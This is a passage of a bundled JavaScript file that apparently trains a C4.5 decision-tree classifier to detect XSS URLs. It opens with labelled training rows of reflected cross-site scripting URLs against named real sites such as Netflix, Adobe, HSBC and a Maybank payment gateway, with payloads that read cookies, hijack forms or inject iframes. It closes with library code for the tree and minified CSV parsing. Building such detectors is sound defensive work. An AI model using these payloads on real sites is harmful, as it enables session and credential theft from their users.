javascript method;XSS\r\n\"https://secure.derwesten.de/registrierung/index.php?nameOrEmail=\"\"><script>alert(document.cookie)</script>&action=login\";Kurang dari 54;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"https://signup.netflix.com/Login?email=\"\"%20onblur%3D\"\"%24('form').submit(function(e)%7Balert(%24('.form-input').val()%2B'%2C%20'%2B%24('input').slice(2).val())%7D)\"\"%20value%3D\"\"\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttps://store1.adobe.com/cfusion/lad/xml.cfm?groupCode=SeeMe+%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E+SeeMe&method=getLocalizedLabelsByGroup&uc=1&loc=en_us;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"https://topup.orange.com/?_lang=\"\"><script>alert(document.cookie)</script>\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"https://tv.adobe.com/login/login?redirect=index.cfm%22%3E%3Cscript%3Ewindow.location.assign(\"\"http://www.reddit.com/r/XSS/\"\")%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"https://ufc.tv/ufc/secure/signup?redirect=%27%22()%26%251%3CScRiPt%20%3Eprompt(%22hacked%20by%20s3rver.exe%20,%20OpUFC%20Anonymous%20CabinCr3w%22)%3C/ScRiPt%3E%3Cimg%20src=%22http://blogs-images.forbes.com/parmyolson/files/2011/08/anonymous-logo-1.jpg%22%20onerror=alert(document.cookie);%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"https://uyeler.mynet.com/index/pwdremind_byemail.jsp?u=<script>alert(\"\"HEYYO OFFICIAL\"\")</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttps://winelibrary.com/login.asp?back=/myordertracking.asp%22%3E%3Cscript%3Ealert(1337)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"https://www.aetna.com/planselection/mbrDis.jsp?id=375\"\"><script>alert(1337)</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"https://www.maybankard.net/SENTRY/PaymentGateway/Application/RedirectLink.aspx?Version=1.0.0&MerRespURL=https://epayment.johor.gov.my/sentry/receive&MerID=027007010432&PurchaseCur rency=458&PurchaseCurrencyExponent=2&AcqID=450618&OrderID=\"\"><script>alert(document.cookie)</script>& SignatureMethod=SHA1&PurchaseAmt=000000016800&Signature=DsdptLJHhKSJ8zIRomdSBQnjFrQ=\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttps://www.mcafeesecure.com/not-certified?host=%22onmouseover%3d%22alert%281%29%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"https://www.ohloh.net/p/filezilla/download?filename=<script>alert(\"\"XSSed by SepyanseR\"\")</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttps://www.securitymetrics.com/termsofusedialog.adp?acceptdestination=firewalltest43e51%22style%3d%22x%3aexpression(alert(%27XSS%27))%2251478e4c6c4b42e72&email=lol@lol.com&SUBMIT=Next+-%3e&declinedestination=firewalltest;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"https://www.shacombank.com.hk/ibanking/dse/html/customer/zh_TW/INError.jsp?errCode=2163&encoding=zh_TW&errMode=AE%22;}document.write%28%22%3Ciframe%20src=%27http://xssed.com%27%3E%22%29;%20function%20test%28%29{var%20a=%22\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttps://www.shop.cdu.de/pages/kontakt/contact.php?p=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2fscript%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"https://www.us.hsbc.com/1/2/3/hsbcpremier?code=\"\" onmouseover=\"\"alert(1);\";Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n")});
})();
}).call(this)}).call(this,require('_process'))
},{"_process":1,"c4.5":3,"papaparse":4,"sweetalert2":5}],3:[function(require,module,exports){
(function(root) {
  'use strict';

  function unique(col) {
    var u = {}, a = [];
    for(var i = 0, l = col.length; i < l; ++i){
      if(u.hasOwnProperty(col[i])) {
        continue;
      }
      a.push(col[i]);
      u[col[i]] = 1;
    }
    return a;
  }

  function find(col, pred) {
    var value;
    col.forEach(function(item) {
      var result = pred(item);
      if (result) {
        value = item;
      }
    });
    return value;
  }

  function max(array, fn) {
    var max = -Infinity;
    var index;
    for (var i = 0; i < array.length; i++) {
      var result = fn(array[i]);
      if (result >= max) {
        max = result;
        index = i;
      }
    }
    return typeof index !== 'undefined' ? array[index] : max;
  }

  function sortBy(col, fn) {
   col = [].slice.call(col);
   return col.sort(fn);
  }

  function C45() {
    if (!(this instanceof C45)) {
      return new C45();
    }
    this.features = [];
    this.targets = [];
    this.model = {}
    this.target = ''
  }

  C45.prototype = {
    /**
     * train
     *
     * @param {object} options
     * @param {array} options.data - training data
     * @param {string} options.target - class label
     * @param {array} options.features - features names
     * @param {array} options.featureTypes - features type (ie 'category', 'number')
     * @param {function} callback - callback, containing error and model as parameters
     */
    train: function(options, callback) {
      var data = options.data;
      var target = options.target;
      var features = options.features;
      var featureTypes = options.featureTypes;

      featureTypes.forEach(function(f) {
        if (['number','category'].indexOf(f) === -1) {
          callback(new Error('Unrecognized feature type'));
          return;
        }
      });

      var targets = unique(data.map(function(d) {
        return d[d.length-1];
      }));
      this.features = features;
      this.targets = targets;
      this.target = target

      var classify = this.classify.bind(this)

      var model = {
        features: this.features,
        targets: this.targets,

        // model is the generated tree structure
        model: this._c45(data, target, features, featureTypes, 0),

        classify: function (sample) {
          return classify(this.model, sample)
        },

        toJSON: function() {
          return JSON.stringify(this.model)
        }
      };

      this.model = model.model

      callback(null, model);
    },

    getModel: function() {
      var classify = this.classify.bind(this)
      var model = this.model

      return {
        features: this.features,
        targets: this.targets,
        classify: function (sample) {
          return classify(model, sample)
        },
        toJSON: function() {
          return JSON.stringify(this.model)
        }
      }
    },

    _c45: function(data, target, features, featureTypes, depth) {
      var targets = unique(data.map(function(d) {
        return d[d.length-1];
      }));

      if (!targets.length) {
        return {
          type: 'result',
          value: 'none data',
          name: 'none data'
        };
      }

      if (targets.length === 1) {
        return {
          type: 'result',
          value: targets[0],
          name: targets[0]
        };
      }

      if (!features.length) {
        var topTarget = this.mostCommon(targets);
        return {
          type: 'result',
          value: topTarget,
          name: topTarget
        };
      }

      var bestFeatureData = this.maxGain(data, target, features, featureTypes);
      var bestFeature = bestFeatureData.feature;

      var remainingFeatures = features.slice(0);
      remainingFeatures.splice(features.indexOf(bestFeature), 1);

      if (featureTypes[this.features.indexOf(bestFeature)] === 'category') {
        var possibleValues = unique(data.map(function(d) {
          return d[this.features.indexOf(bestFeature)];
        }.bind(this)));
        var node = {
          name: bestFeature,
          type: 'feature_category',
          values: possibleValues.map(function(v) {
            var newData = data.filter(function(x) {
              return x[this.features.indexOf(bestFeature)] === v;
            }.bind(this));
            var childNode = {
              name: v,
              type: 'feature_value',
              child: this._c45(newData, target, remainingFeatures, featureTypes, depth+1)
            };
            return childNode;
          }.bind(this))
        };
      } else if (featureTypes[this.features.indexOf(bestFeature)] === 'number') {
        var possibleValues = unique(data.map(function(d) {
          return d[this.features.indexOf(bestFeature)];
        }.bind(this)));
        var node = {
          name: bestFeature,
          type: 'feature_number',
          cut: bestFeatureData.cut,
          values: []
        };

        var newDataRight = data.filter(function(x) {
          return parseFloat(x[this.features.indexOf(bestFeature)]) > bestFeatureData.cut;
        }.bind(this));
        var childNodeRight = {
          name: bestFeatureData.cut.toString(),
          type: 'feature_value',
          child: this._c45(newDataRight, target, remainingFeatures, featureTypes, depth+1)
        };
        node.values.push(childNodeRight);

        var newDataLeft = data.filter(function(x) {
          return parseFloat(x[this.features.indexOf(bestFeature)]) <= bestFeatureData.cut;
        }.bind(this));
        var childNodeLeft = {
          name: bestFeatureData.cut.toString(),
          type: 'feature_value',
          child: this._c45(newDataLeft, target, remainingFeatures, featureTypes, depth+1),
        };
        node.values.push(childNodeLeft);
      }
      return node;
    },

    maxGain: function(data, target, features, featureTypes) {
      var g45 = features.map(function(feature) {
        return this.gain(data, target, features, feature, featureTypes);
      }.bind(this));
      return max(g45, function(e) {
        return e.gain;
      });
    },

    gain: function(data, target, features, feature, featureTypes) {
      var setEntropy = this.entropy(data.map(function(d) {
        return d[d.length-1];
      }));
      if (featureTypes[this.features.indexOf(feature)] === 'category') {
        var attrVals = unique(data.map(function(d) {
          return d[this.features.indexOf(feature)];
        }.bind(this)));
        var setSize = data.length;
        var entropies = attrVals.map(function(n) {
          var subset = data.filter(function(x) {
            return x[feature] === n;
          });
          return (subset.length/setSize) * this.entropy(
            subset.map(function(d) {
              return d[d.length-1];
            })
          );
        }.bind(this));
        var sumOfEntropies = entropies.reduce(function(a, b) {
          return a + b;
        }, 0);
        return {
          feature: feature,
          gain: setEntropy - sumOfEntropies,
          cut: 0
        };
      } else if (featureTypes[this.features.indexOf(feature)] === 'number') {
        var attrVals = unique(data.map(function(d) {
          return d[this.features.indexOf(feature)];
        }.bind(this)));
        var gainVals = attrVals.map(function(cut) {
          var cutf = parseFloat(cut);
          var gain = setEntropy - this.conditionalEntropy(data, feature, cutf, target);
          return {
              feature: feature,
              gain: gain,
              cut: cutf
          };
        }.bind(this));
        var maxgain = max(gainVals, function(e) {
          return e.gain;
        });
        return maxgain;
      }
    },

    entropy: function(vals) {
      var uniqueVals = unique(vals);
      var probs = uniqueVals.map(function(x) {
        return this.prob(x, vals);
      }.bind(this));
      var logVals = probs.map(function(p) {
        return -p * this.log2(p);
      }.bind(this));
      return logVals.reduce(function(a, b) {
        return a + b;
      }, 0);
    },

    conditionalEntropy: function(data, feature, cut, target) {
      var subset1 = data.filter(function(x) {
        return parseFloat(x[this.features.indexOf(feature)]) <= cut;
      }.bind(this));
      var subset2 = data.filter(function(x) {
        return parseFloat(x[this.features.indexOf(feature)]) > cut;
      }.bind(this));
      var setSize = data.length;
      return subset1.length/setSize * this.entropy(
        subset1.map(function(d) {
          return d[d.length-1];
        })
      ) + subset2.length/setSize*this.entropy(
        subset2.map(function(d) {
          return d[d.length-1];
        })
      );
    },

    prob: function(target, targets) {
      return this.count(target,targets)/targets.length;
    },

    mostCommon: function(targets) {
      return sortBy(targets, function(target) {
        return this.count(target, targets);
      }.bind(this)).reverse()[0];
    },

    count: function(target, targets) {
      return targets.filter(function(t) {
        return t === target;
      }).length;
    },

    log2: function(n) {
      return Math.log(n) / Math.log(2);
    },

    toJSON: function() {
      return JSON.stringify({
        features: this.features,
        targets: this.targets,
        target: this.target,
        model: this.model,
      })
    },

    classify: function classify(model, sample) {
      // root is feature (attribute) containing all sub values
      var root = model;

      if (typeof root === 'undefined') {
        throw new Error('model is undefined')
      }

      while (root.type !== 'result') {
        var childNode;

        if (root.type === 'feature_number') {
          var featureName = root.name;
          var sampleVal = parseFloat(sample[featureName]);

          if (sampleVal <= root.cut) {
            childNode = root.values[1];
          } else {
            childNode = root.values[0];
          }
        } else {
          // feature syn attribute
          var feature = root.name;
          var sampleValue = sample[this.features.indexOf(feature)];

          // sub value , containing 2 childs
          childNode = find(root.values, function(x) {
            return x.name === sampleValue;
          });
        }

        // non trained feature
        if (typeof childNode === 'undefined') {
          return 'unknown';
        }
        root = childNode.child;
      }
      return root.value;
    },

    restore: function(options) {
      this.features = options.features || []
      this.targets = options.targets || ''
      this.target = options.target || ''
      this.model = options.model || {}
    }
  };

  if (typeof exports !== 'undefined') {
    if (typeof module !== 'undefined' && module.exports) {
      exports = module.exports = C45;
    }
    exports.C45 = C45;
  } else if (typeof define === 'function' && define.amd) {
    define([], function() {
      return C45;
    });
  } else {
    root.C45 = C45;
  }

})(this);

},{}],4:[function(require,module,exports){
/* @license
Papa Parse
v5.3.0
https://github.com/mholt/PapaParse
License: MIT
*/
!function(e,t){"function"==typeof define&&define.amd?define([],t):"object"==typeof module&&"undefined"!=typeof exports?module.exports=t():e.Papa=t()}(this,function s(){"use strict";var f="undefined"!=typeof self?self:"undefined"!=typeof window?window:void 0!==f?f:{};var n=!f.document&&!!f.postMessage,o=n&&/blob:/i.test((f.location||{}).protocol),a={},h=0,b={parse:function(e,t){var i=(t=t||{}).dynamicTyping||!1;U(i)&&(t.dynamicTypingFunction=i,i={});if(t.dynamicTyping=i,t.transform=!!U(t.transform)&&t.transform,t.worker&&b.WORKERS_SUPPORTED){var r=function(){if(!b.WORKERS_SUPPORTED)return!1;var e=(i=f.URL||f.webkitURL||null,r=s.toString(),b.BLOB_URL||(b.BLOB_URL=i.createObjectURL(new Blob(["(",r,")();"],{type:"text/javascript"})))),t=new f.Worker(e);var i,r;return t.onmessage=m,t.id=h++,a[t.id]=t}();return r.userStep=t.step,r.userChunk=t.chunk,r.userComplete=t.complete,r.userError=t.error,t.step=U(t.step),t.chunk=U(t.chunk),t.complete=U(t.complete),t.error=U(t.error),delete t.worker,void r.postMessage({input:e,config:t,workerId:r.id})}var n=null;b.NODE_STREAM_INPUT,"string"==typeof e?n=t.download?new l(t):new p(t):!0===e.readable&&U(e.read)&&U(e.on)?n=new g(t):(f.File&&e instanceof File||e instanceof Object)&&(n=new c(t));return n.stream(e)},unparse:function(e,t){var n=!1,m=!0,_=",",v="\r\n",s='"',a=s+s,i=!1,r=null,o=!1;!function(){if("object"!=typeof t)return;"string"!=typeof t.delimiter||b.BAD_DELIMITERS.filter(function(e){return-1!==t.delimiter.indexOf(e)}).length||(_=t.delimiter);("boolean"==typeof t.quotes||"function"==typeof t.quotes||Array.isArray(t.quotes))&&(n=t.quotes);"boolean"!=typeof t.skipEmptyLines&&"string"!=typeof t.skipEmptyLines||(i=t.skipEmptyLines);"string"==typeof t.newline&&(v=t.newline);"string"==typeof t.quoteChar&&(s=t.quoteChar);"boolean"==typeof t.header&&(m=t.header);if(Array.isArray(t.columns)){if(0===t.columns.length)throw new Error("Option columns is empty");r=t.columns}void 0!==t.escapeChar&&(a=t.escapeChar+s);"boolean"==typeof t.escapeFormulae&&(o=t.escapeFormulae)}();var h=new RegExp(q(s),"g");"string"==typeof e&&(e=JSON.parse(e));if(Array.isArray(e)){if(!e.length||Array.isArray(e[0]))return f(null,e,i);if("object"==typeof e[0])return f(r||u(e[0]),e,i)}else if("object"==typeof e)return"string"==typeof e.data&&(e.data=JSON.parse(e.data)),Array.isArray(e.data)&&(e.fields||(e.fields=e.meta&&e.meta.fields),e.fields||(e.fields=Array.isArray(e.data[0])?e.fields:u(e.data[0])),Array.isArray(e.data[0])||"object"==typeof e.data[0]||(e.data=[e.data])),f(e.fields||[],e.data||[],i);throw new Error("Unable to serialize unrecognized input");function u(e){if("object"!=typeof e)return[];var t=[];for(var i in e)t.push(i);return t}function f(e,t,i){var r="";"string"==typeof e&&(e=JSON.parse(e)),"string"==typeof t&&(t=JSON.parse(t));var n=Array.isArray(e)&&0<e.length,s=!Array.isArray(t[0]);if(n&&m){for(var a=0;a<e.length;a++)0<a&&(r+=_),r+=y(e[a],a);0<t.length&&(r+=v)}for(var o=0;o<t.length;o++){var h=n?e.length:t[o].length,u=!1,f=n?0===Object.keys(t[o]).length:0===t[o].length;if(i&&!n&&(u="greedy"===i?""===t[o].join("").trim():1===t[o].length&&0===t[o][0].length),"greedy"===i&&n){for(var d=[],l=0;l<h;l++){var c=s?e[l]:l;d.push(t[o][c])}u=""===d.join("").trim()}if(!u){for(var p=0;p<h;p++){0<p&&!f&&(r+=_);var g=n&&s?e[p]:p;r+=y(t[o][g],p)}o<t.length-1&&(!i||0<h&&!f)&&(r+=v)}}return r}function y(e,t){if(null==e)return"";if(e.constructor===Date)return JSON.stringify(e).slice(1,25);!0===o&&"string"==typeof e&&null!==e.match(/^[=+\-@].*$/)&&(e="'"+e);var i=e.toString().replace(h,a),r="boolean"==typeof n&&n||"function"==typeof n&&n(e,t)||Array.isArray(n)&&n[t]||function(e,t){for(var i=0;i<t.length;i++)if(-1<e.indexOf(t[i]))return!0;return!1}(i,b.BAD_DELIMITERS)||-1<i.indexOf(_)||" "===i.charAt(0)||" "===i.charAt(i.length-1);return r?s+i+s:i}}};if(b.RECORD_SEP=String.fromCharCode(30),b.UNIT_SEP=String.fromCharCode(31),b.BYTE_ORDER_MARK="\ufeff",b.BAD_DELIMITERS=["\r","\n",'"',b.BYTE_ORDER_MARK],b.WORKERS_SUPPORTED=!n&&!!f.Worker,b.NODE_STREAM_INPUT=1,b.LocalChunkSize=10485760,b.RemoteChunkSize=5242880,b.DefaultDelimiter=",",b.Parser=w,b.ParserHandle=i,b.NetworkStreamer=l,b.FileStreamer=c,b.StringStreamer=p,b.ReadableStreamStreamer=g,f.jQuery){var d=f.jQuery;d.fn.parse=function(o){var i=o.config||{},h=[];return this.each(function(e){if(!("INPUT"===d(this).prop("tagName").toUpperCase()&&"file"===d(this).attr("type").toLowerCase()&&f.FileReader)||!this.files||0===this.files.length)return!0;for(var t=0;t<this.files.length;t++)h.push({file:this.files[t],inputElem:this,instanceConfig:d.extend({},i)})}),e(),this;function e(){if(0!==h.length){var e,t,i,r,n=h[0];if(U(o.before)){var s=o.before(n.file,n.inputElem);if("object"==typeof s){if("abort"===s.action)return e="AbortError",t=n.file,i=n.inputElem,r=s.reason,void(U(o.error)&&o.error({name:e},t,i,r));if("skip"===s.action)return void u();"object"==typeof s.config&&(n.instanceConfig=d.extend(n.instanceConfig,s.config))}else if("skip"===s)return void u()}var a=n.instanceConfig.complete;n.instanceConfig.complete=function(e){U(a)&&a(e,n.file,n.inputElem),u()},b.parse(n.file,n.instanceConfig)}else U(o.complete)&&o.complete()}function u(){h.splice(0,1),e()}}}function u(e){this._handle=null,this._finished=!1,this._completed=!1,this._halted=!1,this._input=null,this._baseIndex=0,this._partialLine="",this._rowCount=0,this._start=0,this._nextChunk=null,this.isFirstChunk=!0,this._completeResults={data:[],errors:[],meta:{}},function(e){var t=E(e);t.chunkSize=parseInt(t.chunkSize),e.step||e.chunk||(t.chunkSize=null);this._handle=new i(t),(this._handle.streamer=this)._config=t}.call(this,e),this.parseChunk=function(e,t){if(this.isFirstChunk&&U(this._config.beforeFirstChunk)){var i=this._config.beforeFirstChunk(e);void 0!==i&&(e=i)}this.isFirstChunk=!1,this._halted=!1;var r=this._partialLine+e;this._partialLine="";var n=this._handle.parse(r,this._baseIndex,!this._finished);if(!this._handle.paused()&&!this._handle.aborted()){var s=n.meta.cursor;this._finished||(this._partialLine=r.substring(s-this._baseIndex),this._baseIndex=s),n&&n.data&&(this._rowCount+=n.data.length);var a=this._finished||this._config.preview&&this._rowCount>=this._config.preview;if(o)f.postMessage({results:n,workerId:b.WORKER_ID,finished:a});else if(U(this._config.chunk)&&!t){if(this._config.chunk(n,this._handle),this._handle.paused()||this._handle.aborted())return void(this._halted=!0);n=void 0,this._completeResults=void 0}return this._config.step||this._config.chunk||(this._completeResults.data=this._completeResults.data.concat(n.data),this._completeResults.errors=this._completeResults.errors.concat(n.errors),this._completeResults.meta=n.meta),this._completed||!a||!U(this._config.complete)||n&&n.meta.aborted||(this._config.complete(this._completeResults,this._input),this._completed=!0),a||n&&n.meta.paused||this._nextChunk(),n}this._halted=!0},this._sendError=function(e){U(this._config.error)?this._config.error(e):o&&this._config.error&&f.postMessage({workerId:b.WORKER_ID,error:e,finished:!1})}}function l(e){var r;(e=e||{}).chunkSize||(e.chunkSize=b.RemoteChunkSize),u.call(this,e),this._nextChunk=n?function(){this._readChunk(),this._chunkLoaded()}:function(){this._readChunk()},this.stream=function(e){this._input=e,this._nextChunk()},this._readChunk=function(){if(this._finished)this._chunkLoaded();else{if(r=new XMLHttpRequest,this._config.withCredentials&&(r.withCredentials=this._config.withCredentials),n||(r.onload=y(this._chunkLoaded,this),r.onerror=y(this._chunkError,this)),r.open(this._config.downloadRequestBody?"POST":"GET",this._input,!n),this._config.downloadRequestHeaders){var e=this._config.downloadRequestHeaders;for(var t in e)r.setRequestHeader(t,e[t])}if(this._config.chunkSize){var i=this._start+this._config.chunkSize-1;r.setRequestHeader("Range","bytes="+this._start+"-"+i)}try{r.send(this._config.downloadRequestBody)}catch(e){this._chunkError(e.message)}n&&0===r.status&&this._chunkError()}},this._chunkLoaded=function(){4===r.readyState&&(r.status<200||400<=r.status?this._chunkError():(this._start+=this._config.chunkSize?this._config.chunkSize:r.responseText.length,this._finished=!this._config.chunkSize||this._start>=function(e){var t=e.getResponseHeader("Content-Range");if(null===t)return-1;return parseInt(t.substring(t.lastIndexOf("/")+1))}(r),this.parseChunk(r.responseText)))},this._chunkError=function(e){var t=r.statusText||e;this._sendError(new Error(t))}}function c(e){var r,n;(e=e||{}).chunkSize||(e.chunkSize=b.LocalChunkSize),u.call(this,e);var s="undefined"!=typeof FileReader;this.stream=function(e){this._input=e,n=e.slice||e.webkitSlice||e.mozSlice,s?((r=new FileReader).onload=y(this._chunkLoaded,this),r.onerror=y(this._chunkError,this)):r=new FileReaderSync,this._nextChunk()},this._nextChunk=function(){this._finished||this._config.preview&&!(this._rowCount<this._config.preview)||this._readChunk()},this._readChunk=function(){var e=this._input;if(this._config.chunkSize){var t=Math.min(this._start+this._config.chunkSize,this._input.size);e=n.call(e,this._start,t)}var i=r.readAsText(e,this._config.encoding);s||this._chunkLoaded({target:{result:i}})},this._chunkLoaded=function(e){this._start+=this._config.chunkSize,this._finished=!this._config.chunkSize||this._start>=this._input.size,this.parseChunk(e.target.result)},this._chunkError=function(){this._sendError(r.error)}}function p(e){var i;u.call(this,e=e||{}),this.stream=function(e){return i=e,this._nextChunk()},this._nextChunk=function(){if(!this._finished){var e,t=this._config.chunkSize;return t?(e=i.substring(0,t),i=i.substring(t)):(e=i,i=""),this._finished=!i,this.parseChunk(e)}}}function g(e){u.call(this,e=e||{});var t=[],i=!0,r=!1;this.pause=function(){u.prototype.pause.apply(this,arguments),this._input.pause()},this.resume=function(){u.prototype.resume.apply(this,arguments),this._input.resume()},this.stream=function(e){this._input=e,this._input.on("data",this._streamData),this._input.on("end",this._streamEnd),this._input.on("error",this._streamError)},this._checkIsFinished=function(){r&&1===t.length&&(this._finished=!0)},this._nextChunk=function(){this._checkIsFinished(),t.length?this.parseChunk(t.shift()):i=!0},this._streamData=y(function(e){try{t.push("string"==typeof e?e:e.toString(this._config.encoding)),i&&(i=!1,this._checkIsFinished(),this.parseChunk(t.shift()))}catch(e){this._streamError(e)}},this),this._streamError=y(function(e){this._streamCleanUp(),this._sendError(e)},this),this._streamEnd=y(function(){this._streamCleanUp(),r=!0,this._streamData("")},this),this._streamCleanUp=y(function(){this._input.removeListener("data",this._streamData),this._input.removeListener("end",this._streamEnd),this._input.removeListener("error",this._streamError)},this)}function i(_){var a,o,h,r=Math.pow(2,53),n=-r,s=/^\s*-?(\d+\.?|\.\d+|\d+\.\d+)(e[-+]?\d+)?\s*$/,u=/(\d{4}-[01]\d-[0-3]\dT[0-2]\d:[0-5]\d:[0-5]\d\.\d+([+-][0-2]\d:[0-5]\d|Z))|(\d{4}-[01]\d-[0-3]\dT[0-2]\d:[0-5]\d:[0-5]\d([+-][0-2]\d:[0-5]\d|Z))|(\d{4}-[01]\d-[0-3]\dT[0-2]\d:[0-5]\d([+-][0-2]\d:[0-5]\d|Z))/,t=this,i=0,f=0,d=!1,e=!1,l=[],c={data:[],errors:[],meta:{}};if(U(_.step)){var p=_.step;_.step=function(e){if(c=e,m())g();else{if(g(),0===c.data.length)return;i+=e.data.length,_.preview&&i>_.preview?o.abort():(c.data=c.data[0],p(c,t))}}}function v(e){return"greedy"===_.skipEmptyLines?""===e.join("").trim():1===e.length&&0===e[0].length}function g(){if(c&&h&&(k("Delimiter","UndetectableDelimiter","Unable to auto-detect delimiting character; defaulted to '"+b.DefaultDelimiter+"'"),h=!1),_.skipEmptyLines)for(var e=0;e<c.data.length;e++)v(c.data[e])&&c.data.splice(e--,1);return m()&&function(){if(!c)return;function e(e,t){U(_.transformHeader)&&(e=_.transformHeader(e,t)),l.push(e)}if(Array.isArray(c.data[0])){for(var t=0;m()&&t<c.data.length;t++)c.data[t].forEach(e);c.data.splice(0,1)}else c.data.forEach(e)}(),function(){if(!c||!_.header&&!_.dynamicTyping&&!_.transform)return c;function e(e,t){var i,r=_.header?{}:[];for(i=0;i<e.length;i++){var n=i,s=e[i];_.header&&(n=i>=l.length?"__parsed_extra":l[i]),_.transform&&(s=_.transform(s,n)),s=y(n,s),"__parsed_extra"===n?(r[n]=r[n]||[],r[n].push(s)):r[n]=s}return _.header&&(i>l.length?k("FieldMismatch","TooManyFields","Too many fields: expected "+l.length+" fields but parsed "+i,f+t):i<l.length&&k("FieldMismatch","TooFewFields","Too few fields: expected "+l.length+" fields but parsed "+i,f+t)),r}var t=1;!c.data.length||Array.isArray(c.data[0])?(c.data=c.data.map(e),t=c.data.length):c.data=e(c.data,0);_.header&&c.meta&&(c.meta.fields=l);return f+=t,c}()}function m(){return _.header&&0===l.length}function y(e,t){return i=e,_.dynamicTypingFunction&&void 0===_.dynamicTyping[i]&&(_.dynamicTyping[i]=_.dynamicTypingFunction(i)),!0===(_.dynamicTyping[i]||_.dynamicTyping)?"true"===t||"TRUE"===t||"false"!==t&&"FALSE"!==t&&(function(e){if(s.test(e)){var t=parseFloat(e);if(n<t&&t<r)return!0}return!1}(t)?parseFloat(t):u.test(t)?new Date(t):""===t?null:t):t;var i}function k(e,t,i,r){var n={type:e,code:t,message:i};void 0!==r&&(n.row=r),c.errors.push(n)}this.parse=function(e,t,i){var r=_.quoteChar||'"';if(_.newline||(_.newline=function(e,t){e=e.substring(0,1048576);var i=new 